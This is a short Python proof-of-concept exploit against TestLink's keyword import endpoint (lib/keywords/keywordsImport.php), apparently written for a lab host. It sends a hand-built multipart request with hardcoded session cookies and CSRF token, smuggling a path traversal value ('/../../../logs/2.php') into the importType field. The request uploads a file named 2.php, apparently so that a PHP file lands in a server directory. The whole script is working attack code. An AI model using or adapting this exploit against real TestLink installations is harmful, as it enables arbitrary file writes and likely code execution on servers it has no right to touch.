import requests
from selenium import webdriver
def exp(host):
    cookies = {
        'PHPSESSID': 'iaue0f0mntpatc23ibr1psbp8v',
        'TESTLINK1920TESTLINK_USER_AUTH_COOKIE': '45503b85fa85a8d56d745c6ceb3ef955853c19584bee69cd05d5bce2b872bee6',
    }
    headers = {

        'Content-Type': 'multipart/form-data; boundary=---------------------------300685993123735673203366676955',
        # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
        # 'Origin':'http://192.168.56.105:8001',
        # 'Referer':'http://192.168.56.105:8001//lib/keywords/keywordsImport.php?tproject_id=1',
        # 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        # 'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
    }
    data = '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="CSRFName"\n' \
           + '\n' \
           + 'CSRFGuard_410757499' \
           + '\n' \
           + '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="CSRFToken"\n' \
           + '\n' \
           + '47285f6808adff2998041ccb5ad6fa904852f89aa01ac0c81811c85d4ac9added355053b684bea940b61155abf1c27b73f9e7764f1517bb72720c337db2b4703' \
           + '\n' \
           + '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="importType"\n' \
           + '\n' \
           + '/../../../logs/2.php\n' \
           + '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="MAX_FILE_SIZE"\n' \
           + '\n' \
           + '409600\n' \
           + '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="uploadedFile"; filename="2.php"\n' \
           + 'Content-Type: application/octet-stream\n' \
           + '\n' \
           + '11111\n' \
           + '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="tproject_id"\n' \
           + '\n' \
           + '1\n' \
           + '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="UploadFile"\n' \
           + '\n' \
           + 'Upload file\n' \
           + '-----------------------------300685993123735673203366676955--\n'
    response = requests.post(host + '/lib/keywords/keywordsImport.php',
                             cookies=cookies, data=data, headers=headers, verify=False)
    print('a',response.status_code)
    print('a',response.text)

if __name__ == '__main__':
    h = 'http://192.168.56.105:8001'
    exp(h)
